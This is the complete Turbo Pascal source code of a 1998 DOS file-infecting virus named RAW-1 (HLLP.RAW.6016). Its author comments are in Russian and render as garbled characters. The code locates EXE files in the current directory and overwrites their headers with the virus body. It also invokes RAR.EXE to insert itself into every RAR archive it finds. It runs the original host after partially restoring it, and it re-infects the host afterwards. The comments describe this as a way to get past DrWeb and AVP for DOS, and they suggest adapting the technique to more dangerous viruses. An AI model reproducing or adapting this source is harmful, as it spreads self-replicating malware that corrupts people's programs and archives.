   (*           „¥¬®áâà æ¨®ë© ¢¨àãá RAR-AntiWEB

   Name          : [RAW-1] aka [RAR-AntiWEB] aka HLLP.RAW.6016
   Author        : Duke/SMF
   Create date   : 27.09.98
   Type          : HLLP-virii
   Characteristic: ” ©«®¢ë©, ¥à¥§¨¤¥âë©, ¥¯®«¨¬®àäë© ¢¨àãá  :)
                   ¡¥§ ¤¥áâàãªâ¨¢ëå íää¥ªâ®¢.
                   *®à ¦ ¥â ä ©«ë ¢ â¥ªãé¥¬ ª â «®£¥ - § ¯¨áë¢ ¥âáï ¢ EXE-ä ©«ë
                   ¨ RAR- àå¨¢ë (¤«ï íâ®£® âà¥¡ã¥âáï RAR.EXE ¢ ª â «®£ å PATH).
                   ‡  ®¤¨ § ¯ãáª ¯®à ¦ ¥â ®¤¨ EXE-ä ©« ¨ ¢á¥  àå¨¢ë.
   Ÿ§ëª          : Turbo Pascal 7.0+
   Compile       : TPC.EXE raw.pas

   *  ¯à¨¬¥à¥ íâ®£® ¯à¨¬¨â¨¢®£® ¢¨àãá  ¤¥¬®áâà¨àã¥âáï ¢®§¬®¦®áâì á®§¤ ¨ï
   ¢¨àãá®¢, ¨¬¥îé¨å ¥ª®â®àë© "¨¬¬ã¨â¥â" ª  â¨¢¨àãá ¬ "DrWeb for DOS" ¨
   "AVP for DOS". ‚¨àãá ãç¨âë¢ ¥â ¥á¯®á®¡®áâì ¤ ëå  â¨¢¨àãá®¢ â¥áâ¨à®¢ âì
   ¢á¥ RAR- àå¨¢ë ¨ ¨á¯®«ì§ã¥â íâ® ¤«ï á¢®¥£® à §¬®¦¥¨ï. *)
   {---------------------------------------------------------------------------}
   {$M 5000, 0, 50000}
   (*{$A-,B-,D-,E+,F-,G-,I-,L-,N-,S-,V-,X+} I S *)

   uses dos;
   const len=6016;                          {¤«¨  ¢¨àãá }
         met=$92f;                          {¬¥áâ® ¬¥âª¨}
   var  vir_mas:array[1..len-2] of char;    {â¥«® ¢¨àãá }
        fil_mas:array[1..len-2] of char;    {â¥«® ¦¥àâ¢ë}
        name_file:string;                   {¨¬ï § ¯ãé¥®£® ä ©« }
        t : string;
        index:string;                       {¨¤¥â¨ä¨ª â®à ¢¨àãá }
        coman:string;                       {áâà®ª  ¯®¤ GetEnv('COMSPEC')}
        attr : word;                        {§¤¥áì åà ïâáï  âà¨¡ãâë § à ¦ ¥¬®£®
                                             ä ©«  ¢ ¬®¬¥â § à ¦¥¨ï}
   {---------------------------------------------------------------------------}
   procedure attr_get(q:string);            {‘®åà ï¥¬  âà¨¡ãâë ä ©« }
   var w:file;
   begin
   assign(w,q);getfattr(w,attr);setfattr(w,$20);
   end;
   {---------------------------------------------------------------------------}
   procedure attr_set(q:string);            {‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« }
   var w:file;
   begin
   assign(w,q);setfattr(w,attr);
   end;
   {---------------------------------------------------------------------------}
   procedure infect_rar(name_arhiv:string); {*à®æ¥¤ãà  § à ¦¥¨ï RAR- àå¨¢®¢}
   begin
   t:=name_arhiv;
   attr_get(name_arhiv);
       (* ‡ ¯ãáª ¥¬  àå¨¢ â®à RAR á ¯ à ¬¥âà ¬¨:
          rar a -tk -y -c- -o+ arhive.rar file.exe >nul
       Š«îç¨ ¯à®£à ¬¬ë RAR, ª®â®àë¥ âà¥¡ãîâáï ¢¨àãáã :
          -tk   - ¥ ¨§¬¥ïâì ¢à¥¬ï á®§¤ ¨ï  àå¨¢ 
          -y    - ®â¢¥â¨âì "„ "   ¢á¥ ¢®¯à®áë
          -c-   - ¥ ¢ë¢®¤¨âì ª®¬¬¥â à¨¨   íªà 
          -o+   - ¯¥à¥§ ¯¨áë¢ âì ä ©«ë
          -ep   - ¥ § ¯¨áë¢ âì ¯®«ë¥ ¯ãâ¨ ¢  àå¨¢
          a     - ¤®¡ ¢¨âì ä ©« ª  àå¨¢ã
       *®áª®«ìªã ¯®áâ ¢¨âì ¬¥âªã ® â®¬, çâ® ¤ ë©  àå¨¢ ã¦¥ § à ¦¥, ¤®¢®«ì®
       ¯à®¡«¥¬ â¨ç®, â® ¯à¨å®¤¨âáï ¯¥à¥§ ¯¨áë¢ âì ä ©«ë ¢  àå¨¢¥ ¯à¨ ¯®¢â®à®¬
       § à ¦¥¨¨ (ª«îç -o+). *)
   exec(coman,'/c RAR a -tk -y -c- -o+ -ep '+name_arhiv+' '+name_file+'>nul');
   attr_set(name_arhiv);
   end;
   {--------------------------------------------------------------------------}
   procedure search_rar;
   var nam:searchrec;
   label lb2;
   begin
       (* ‚¨àãá ¨é¥â ¢ â¥ªãé¥¬ ª â «®£¥ ¯® ¬ áª¥ RAR- àå¨¢ë. *à¨ ¨å ®¡ àã¦¥¨¨
       ¢¨àãá  ¤¥¥âáï    «¨ç¨¥  àå¨¢ â®à  RAR ¢ ®¤®¬ ¨§ ª â «®£®¢ ¯¥à¥¬¥®©
       PATH ¨ ¯ëâ ¥âáï § ¯¨á âì ª®¯¨î ¢¨àãá  ¢ íâ®â  àå¨¢.
       *à®æ¥áá § à ¦¥¨ï EXE-ä ©«®¢ ¨ ¯à®æ¥áá § à ¦¥¨ï RAR-ä ©«®¢ à á¯®«®¦¥ë
       ¢ à §ëå ¬¥áâ å ¯à®£à ¬¬ë, çâ®¡ë ¬¥¥¥ ¡ë«  § ¬¥â  § ¤¥à¦ª  ¢® ¢à¥¬¥¨
       à ¡®âë § à ¦¥®£® ä ©« . *)
   {exec(coman,'/c ctty nul>nul');                  }
   findfirst('*.rar',$21,nam);
   if doserror<>0 then goto lb2 else infect_rar(nam.name);
   while doserror=0 do
     begin
     findnext(nam);
     if t=nam.name then goto lb2 else infect_rar(nam.name);
     end;
   lb2:
   {exec(coman,'/c ctty con');}
   end;
   {---------------------------------------------------------------------------}
   procedure infect_exe(im:string);         {‡ à ¦¥¨¥ EXE-ä ©«®¢}
   var vir,m : file;                        {¢¨àãá ¨ ¦¥àâ¢  á®®â¢¥âáâ¢¥®}
   begin
   filemode:=2;                             {à §à¥è ¥¬ çâ¥¨¥/§ ¯¨áì ¢ ä ©«}
   attr_get(im);                            {á®åà ¨«¨  âà¨¡ãâë ¦¥àâ¢ë}
   assign(vir,name_file);reset(vir,1);      {®âªàë«¨ ¨áå®¤ë© ä ©«}
   seek(vir,2);blockread(vir,vir_mas,len-2);{áç¨â «¨ ¨§ ¥£® ¢¨àãá}
   close(vir);                              {§ ªàë«¨ ä ©« á ¢¨àãá®¬}
   assign(m,im);reset(m,1);                 {®âªàë«¨ ä ©«-¦¥àâ¢ã}
   seek(m,2);blockread(m,fil_mas,len-2);    {áç¨â «¨ â¥«® ä ©« }
   seek(m,filesize(m));
   blockwrite(m,fil_mas,len-2);             {á®åà ¨«¨ â¥«® ä ©« }
   seek(m,2);blockwrite(m,vir_mas,len-2);   {§ ¯¨á «¨ ¢¨àãá ¢ ä ©«-¦¥àâ¢ã}
   close(m);                                {§ ªàë«¨ ¦¥àâ¢ã}
   attr_set(im);                            {ãáâ ®¢¨«¨  âà¨¡ãâë ¦¥àâ¢ë}
       (* *à®æ¥áá § à ¦¥¨ï § ¢¥àè¥ *)
   end;
   {---------------------------------------------------------------------------}
   procedure search_exe;                    {*®¨áª EXE-ä ©«®¢}
   var g:file of char;                      {ä ©«-ª ¤¨¤ â}
       a,b,c:char;                          {¤«ï çâ¥¨ï ¬¥âª¨}
       n:searchrec;
   label lb1;
   begin
       (* ˆé¥¬ ¢ â¥ªãé¥¬ ª â «®£¥ EXE-ä ©«ë ¯® ¬ áª¥,
       ¯à®¢¥àï¥¬ ¨å   ¯à¥¤¬¥â § à ¦¥¨ï *)
   findfirst('*.exe',$21,n);
       (* *à®¢¥àª    § à ¦¥®áâì: *)
   lb1:
   filemode:=0;                             {§ ¯à¥é ¥¬ § ¯¨áì ¢ ä ©«}
   assign(g,n.name);reset(g);
   seek(g,met);
   read(g,a,b,c);{read(g,b);read(g,c);}
   close(g);
   if (a='R') and (b='A') and (c='W') then
     begin
     findnext(n);
     if doserror<>0 then exit else goto lb1;
     end
   else infect_exe(n.name);                 {*®¤å®¤ïé¨© ä ©«  ©¤¥ - § à ¦ ¥¬!}
   end;
   {---------------------------------------------------------------------------}
   procedure zapusk;
   var ish : file;
       st  : string;
       i   : integer;
   begin
       (* *à®¢¥àï¥¬ § ¯ãé¥ë© ä ©«. …á«¨ ¥£® à §¬¥à <=len, â® ¡ë« § ¯ãé¥
       ç¨áâë© ¢¨àãá ¨ ¬ë ¯¥à¥å®¤¨¬ ª ¯®à ¦¥¨î  àå¨¢®¢. ˆ ç¥ ¡ë« § ¯ãé¥
       ¯®à ¦¥ë© ä ©« ¨  ¬  ¤® ¯¥à¥¤ âì ã¯à ¢«¥¨¥  áâ®ïé¥© ¯à®£à ¬¬¥. *)
   filemode:=0;                             {§ ¯à¥é ¥¬ § ¯¨áì ¢ ä ©«}
   assign(ish,name_file);reset(ish,1);
   if filesize(ish)<=len then exit;
   close(ish);
       (* *  ¢à¥¬ï "«¥ç¨¬" § ¯ãé¥ë© ä ©«: *)
   attr_get(name_file);                     {á®åà ¨«¨  âà¨¡ãâë}
   filemode:=2;                             {à §à¥è ¥¬ çâ¥¨¥/§ ¯¨áì ¢ ä ©«}
   reset(ish,1);                            {®âªàë«¨ § ¯ãé¥ë© ä ©«}
   seek(ish,2);blockread(ish,vir_mas,len-2);{áç¨â «¨ ¨§ ¥£® ¢¨àãá}
   seek(ish,filesize(ish)-(len-2));
   blockread(ish,fil_mas,len-2);            {áç¨â «¨ â¥«® ä ©« }
   seek(ish,filesize(ish)-(len-2));
   truncate(ish);                           {®¡à¥§ «¨ ä ©« ¤® ®à¬ë}
   seek(ish,2);
   blockwrite(ish,fil_mas,len-2);           {§ ¯¨á «¨   ¬¥áâ® â¥«® ä ©« }
   close(ish);                              {§ ªàë«¨ § ¯ãé¥ë© ä ©«}
       (* ‡ ¯ãáª ¥¬ ®âà¥¤ ªâ¨à®¢ ë© ä ©«: *)
   st:=' ';
   for i:=1 to paramcount do st:=st+paramstr(i)+' ';
   exec(coman,'/c '+name_file+st);
       (* ‘®¢  § à ¦ ¥¬ § ¯ãé¥ë© ä ©«: *)
   reset(ish,1);                            {®âªàë«¨ § ¯ãé¥ë© ä ©«}
   seek(ish,filesize(ish));
   blockwrite(ish,fil_mas,len-2);           {§ ¯¨á «¨ ¢ ª®¥æ â¥«® ä ©« }
   seek(ish,2);
   blockwrite(ish,vir_mas,len-2);           {§ ¯¨á «¨ ¢  ç «® ¢¨àãá}
   close(ish);                              {§ ªàë«¨ § ¯ãé¥ë© ä ©«}
   attr_set(name_file);                     {¢¥àã«¨ ¯¥à¢® ç «ìë¥  âà¨¡ãâë}
   end;
   {---------------------------------------------------------------------------}
   begin
   index:='[RAW-1, Duke/SMF]';              {¨¤¥â¨ä¨ª â®à ¢¨àãá }
   name_file:=paramstr(0);                  {¨¬ï ä ©« ,¨§ ª®â®à®£® § ¯ãé¥ ¢¨àãá}
   coman:=GetEnv('COMSPEC');                {¯ãâì ª ï¤àã Ž‘}
   search_rar;                              {§ à ¦ ¥¬ RAR- àå¨¢ë}
   zapusk;                                  {§ ¯ãáª ¥¬ ¯®à ¦¥ãî ¯à®£à ¬¬ã}
   search_exe;                              {§ à ¦ ¥¬ EXE-ä ©«ë}
   end.
   {---------------------------------------------------------------------------}
       (* *â®â ¢¨àãá çà¥§¢ëç ©® ¯à¨¬¨â¨¢¥, ® ¥á«¨ â® ¦¥ á ¬®¥  ¯¨á âì
          áá¥¬¡«¥à¥, ãá®¢¥àè¥áâ¢®¢ âì ¨ ¯¥à¥¤¥« âì, â® íâ® ¬®¦¥â ®âªàëâì
       ¤®à®£ã ®¢®© £àã¯¯¥ ¢¨àãá®¢, ¯à®â¨¢ ª®â®àëå  â¨¢¨àãáë "DrWeb for DOS"
       ¨ "AVP for DOS" ¡ã¤ãâ ¯à ªâ¨ç¥áª¨ ¡¥áá¨«ìë. *®¤®¡ë¬  «£®à¨â¬®¬ ¬®£ãâ
       ¡ëâì ¬®¤¨ä¨æ¨à®¢ ë ã¦¥ áãé¥áâ¢ãîé¨¥ ®ç¥ì ®¯ áë¥ ¢¨àãáë; ® ¬®¦¥â ¡ëâì
       ¤®¡ ¢«¥ ¢ AWME ¤«ï ¯à®â¨¢®¤¥©áâ¢¨ï ¯à®£à ¬¬¥ "DrWeb".  *)
